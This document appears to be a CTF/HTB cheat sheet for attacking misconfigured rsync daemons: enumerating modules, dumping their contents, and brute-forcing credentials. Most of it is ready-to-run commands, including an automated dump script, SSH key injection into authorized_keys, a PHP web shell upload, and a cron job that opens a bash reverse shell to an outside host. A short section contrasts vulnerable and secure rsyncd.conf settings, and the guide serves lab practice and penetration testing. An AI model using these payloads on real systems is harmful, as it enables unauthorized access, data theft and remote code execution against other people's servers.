> **Rsync** (Remote Sync) is a fast file synchronization tool that runs on **port 873**. It's commonly misconfigured in CTFs to allow **anonymous/unauthenticated access** to shared directories (modules), making it a high-value target for data exfiltration and — if writable — RCE via SSH key injection or web shells.

---

## Quickstart — Module Enumeration & Data Exfiltration

```bash
# List available modules (shared directories) — the first thing to try
$ rsync 10.129.1.10::

# Download everything from a module
$ rsync -av 10.129.1.10::module_name ./local-destination/

# List contents of a module without downloading
$ rsync --list-only 10.129.1.10::module_name

# Download with verbose output
$ rsync -av 10.129.1.10::module_name /tmp/output/
```

**If you know the module name, probe it directly:**
```bash
$ rsync --list-only 10.129.1.10::public
$ rsync --list-only 10.129.1.10::backup
$ rsync --list-only 10.129.1.10::data
$ rsync --list-only 10.129.1.10::www
```

### ✅ Before starting — essential checks
```bash
$ nmap -sCV -p873 10.129.1.10
# Look for "rsync" and "rsync-list-modules" in the output

$ nc -nv 10.129.1.10 873
# Expect: @RSYNCD: 31.0        (or another version number)
```

---

## Rsync Protocol — How It Works

Rsync operates over its own protocol on TCP 873. A typical session looks like:

```
$ nc -nv 10.129.1.10 873
Connection to 10.129.1.10 873 port [tcp/rsync] succeeded!
@RSYNCD: 31.0                  # server greeting + version
@RSYNCD: 31.0                  # you send your version back
#list                         # send "#list" to enumerate modules
public                  backup                  data
www                     @RSYNCD: EXIT           # server responds with module list
```

> ℹ️ You can interact with the raw protocol using `nc` or `socat` if `rsync` isn't installed on your attack machine.

---

## Common Rsync Commands

| Command | What it does |
| :------ | :----------- |
| `rsync <host>::` | List available modules (no auth) |
| `rsync <host>::<module>` | List files inside a module (same as `--list-only`) |
| `rsync -av <host>::<module> ./dest/` | Download module contents to local directory |
| `rsync -av ./file <host>::<module>/` | Upload a file to the module (if writable) |
| `rsync -av <host>::<module>/subdir/ ./dest/` | Download a specific subdirectory |
| `rsync -av <host>::<module> ./dest/ --dry-run` | Preview what would be downloaded (safe) |
| `rsync -avz <host>::<module> ./dest/` | Download with compression |
| `rsync -e ssh <user>@<host>:/path ./dest/` | Rsync over SSH (port 22, different protocol) |

---

## Core Rsync Flags for CTF

| Flag | What it does |
| :--- | :----------- |
| `-a` | Archive mode — preserves permissions, symlinks, timestamps (CTF standard) |
| `-v` | Verbose — show files being transferred |
| `-z` | Enable compression during transfer |
| `-r` | Recursive — copy directories recursively |
| `-P` | Show progress + resume partial transfers |
| `--list-only` | List files in the module without downloading |
| `--dry-run` | Preview changes without actually transferring (**test first!**) |
| `--delete` | Delete files in dest that don't exist in source (⚠️ dangerous) |
| `--exclude=<pattern>` | Exclude files matching pattern |
| `--include=<pattern>` | Include only files matching pattern |
| `--max-size=<size>` | Skip files larger than N (e.g., `--max-size=10M`) |
| `--timeout=<secs>` | Set I/O timeout in seconds |
| `--bwlimit=<KBPS>` | Limit bandwidth (stealthy transfers) |
| `-e ssh` | Use SSH as the transport (port 22, requires credentials) |
| `--no-motd` | Suppress message of the day banner |
| `--stats` | Show transfer statistics at the end |
| `-h` | Human-readable sizes in output |

---

## Useful Nmap Scripts

```bash
# List rsync modules (the most useful script)
nmap --script rsync-list-modules -p873 10.129.1.10

# Full service + version detection
nmap -sV -p873 10.129.1.10

# Brute force rsync credentials
nmap --script rsync-brute -p873 10.129.1.10
```

### What `rsync-list-modules` output looks like

```
PORT    STATE SERVICE
873/tcp open  rsync
| rsync-list-modules:
|   public                  backup
|   data                    www
|_  sensitive_data
```

---

## CTF / HTB Techniques

### 1. Module Enumeration — Find What's Exposed

```bash
# Quick module list
$ rsync 10.129.1.10::

# Probe common module names individually
$ for mod in public backup data www files home root var etc tmp share documents admin; do
    echo "=== $mod ==="
    rsync --list-only "10.129.1.10::$mod" 2>/dev/null
  done
```

### 2. Data Exfiltration — Download Everything

```bash
# List first (dry run), then download
$ rsync --list-only 10.129.1.10::public
$ rsync -av 10.129.1.10::public ./public-dump/

# Download a single file
$ rsync -av 10.129.1.10::public/flag.txt ./flag.txt

# Exclude large files to save time
$ rsync -av --max-size=1M 10.129.1.10::public ./dump/
```

### 3. SSH Key Injection — Gain Shell Access

If you can write to a home directory's `.ssh/authorized_keys`, you get instant SSH access:

```bash
# 1. Generate a keypair on your attacker machine
$ ssh-keygen -t rsa -f rsync_key -N ''

# 2. Upload your public key to the target's authorized_keys
$ rsync -av ./rsync_key.pub 10.129.1.10::module_name/home/user/.ssh/authorized_keys

# 3. SSH in with your private key
$ ssh -i rsync_key user@10.129.1.10
```

> ⚠️ The module must have **write access** (`read only = false` in `rsyncd.conf`). Test write access first by uploading a harmless file.

### 4. Web Shell Upload — RCE via Web Root

If the web root (`/var/www/html`) is exposed as a writable rsync module:

```bash
# 1. Create a PHP web shell
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 2. Upload it to the web root via rsync
$ rsync -av ./shell.php 10.129.1.10::www/shell.php

# 3. Execute commands
$ curl "http://10.129.1.10/shell.php?cmd=id"
```

### 5. Crontab Overwrite — Scheduled Task RCE

If you can write to `/etc/cron.d/` or `/var/spool/cron/`:

```bash
# 1. Create a malicious cron job
$ echo '* * * * * root bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"' > exploit.cron

# 2. Upload it via rsync
$ rsync -av ./exploit.cron 10.129.1.10::etc/cron.d/exploit

# 3. Wait up to 1 minute for the reverse shell
```

### 6. Test Write Access — Safe Probe

```bash
# Create a harmless test file
$ echo "test" > /tmp/rsync-test.txt

# Try uploading it to the module
$ rsync -av /tmp/rsync-test.txt 10.129.1.10::module_name/

# If it succeeds, the module is writable. Clean up after yourself.
$ rsync -av --delete /dev/null 10.129.1.10::module_name/rsync-test.txt
```

---

## rsyncd.conf — What a Misconfigured Server Looks Like

The server configuration lives in `/etc/rsyncd.conf`. A vulnerable config looks like:

```ini
uid = root
gid = root
use chroot = no               # ❌ chroot disabled — can escape module path
read only = false             # ❌ write access enabled
list = yes                    # modules are visible

[public]
path = /srv/public
comment = Public files
```

Compare with a secure config:

```ini
uid = nobody                  # ✅ non-root user
gid = nogroup                 # ✅ non-root group
use chroot = yes              # ✅ can't escape module path
read only = true              # ✅ no write access
auth users = validuser        # ✅ authentication required
secrets file = /etc/rsyncd.secrets

[backup]
path = /srv/backup
list = no                     # ✅ module hidden from listing
```

> ⚠️ **Key red flags in order of severity:**
> 1. `use chroot = no` — can traverse outside the module path with `../../../`
> 2. `read only = false` — write access enables RCE
> 3. No `auth users` — anonymous access allowed
> 4. `list = yes` (default) — modules are discoverable
> 5. `uid = root` — files are created/written as root

---

## Automation & One-liners

### One-liner — enumerate modules quickly

```bash
rsync 10.129.1.10:: 2>/dev/null | grep -v '^@'
```

### One-liner — probe common module names

```bash
for m in public backup data www files home root var etc tmp share; do rsync --list-only "10.129.1.10::$m" 2>/dev/null && echo "[+] Found: $m"; done
```

### One-liner — download all modules

```bash
rsync 10.129.1.10:: 2>/dev/null | grep -v '^@' | while read mod; do echo "[*] Dumping $mod..."; rsync -av "10.129.1.10::$mod" "./dump-$mod/" 2>/dev/null; done
```

### One-liner — nmap + rsync in one shot

```bash
nmap --script rsync-list-modules -p873 10.129.1.10 -oN rsync-scan.txt && grep '|_' rsync-scan.txt
```

### Full enumeration pipeline

```bash
#!/bin/bash
TARGET="10.129.1.10"

echo "[*] Checking rsync on $TARGET..."
nmap -p873 --script rsync-list-modules $TARGET -oN nmap-rsync.txt

echo "[*] Listing modules..."
rsync $TARGET:: 2>/dev/null | tee modules.txt

echo "[*] Downloading each module..."
grep -v '^@' modules.txt | while read mod; do
  echo "  → Downloading $mod..."
  rsync -av "$TARGET::$mod" "./rsync-dump-$mod/" 2>/dev/null
done

echo "[+] Done. Check ./rsync-dump-*/ directories."
```

### Check raw banner with netcat

```bash
echo -e "@RSYNCD: 31.0\n#list" | nc -w 3 10.129.1.10 873
```

---

## Troubleshooting — What You'll Actually See

| Error / Symptom | Likely Cause |
| :-------------- | :----------- |
| `rsync: connection unexpectedly closed` | Port 873 not open or filtered |
| `@ERROR: access denied to module` | Module exists but requires authentication or IP whitelist |
| `@ERROR: Unknown module '<name>'` | Module doesn't exist — try listing with `rsync <host>::` first |
| `@RSYNCD: 31.0` followed by nothing | Server awaits your command — send `#list` via nc |
| `rsync: failed to connect: Connection refused` | Rsync service not running or port wrong |
| `protocol version mismatch` | Your client version differs — try `--protocol=30` or update rsync |
| `rsync: read errors mapping` | Network issue or server disconnected mid-transfer |
| `@ERROR: auth failed on module <name>` | Module requires credentials — try common passwords or brute force |
| `file has vanished: "/path/to/file"` | File was deleted during transfer — usually harmless, retry |
| `symlink has no referent: "/path"` | Broken symlink on the server — still copies the link but target is missing |

---

## Rsync Over SSH (Port 22)

Rsync can also run over SSH on port 22. This is **not the same** as rsync daemon on port 873 — it uses SSH authentication instead.

```bash
# Rsync over SSH (requires credentials)
$ rsync -av -e ssh user@10.129.1.10:/remote/path ./local/

# Same, with custom SSH port
$ rsync -av -e "ssh -p 2222" user@10.129.1.10:/remote/path ./local/
```

> ℹ️ Rsync over SSH is useful for **post-exploitation** file exfiltration after you already have credentials or an SSH key. The rsync daemon (port 873) is the CTF target — that's where the misconfigurations are.

---

## References

- [Rsync Man Page](https://linux.die.net/man/1/rsync)
- [Rsyncd.conf Man Page](https://linux.die.net/man/5/rsyncd.conf)
- [HackTricks — Pentesting Rsync](https://book.hacktricks.xyz/network-services-pentesting/873-pentesting-rsync)
- [Hackviser — Rsync Pentesting](https://hackviser.com/tactics/pentesting/services/rsync)
- [Nmap NSE — rsync-list-modules](https://nmap.org/nsedoc/scripts/rsync-list-modules.html)
- [Nmap NSE — rsync-brute](https://nmap.org/nsedoc/scripts/rsync-brute.html)
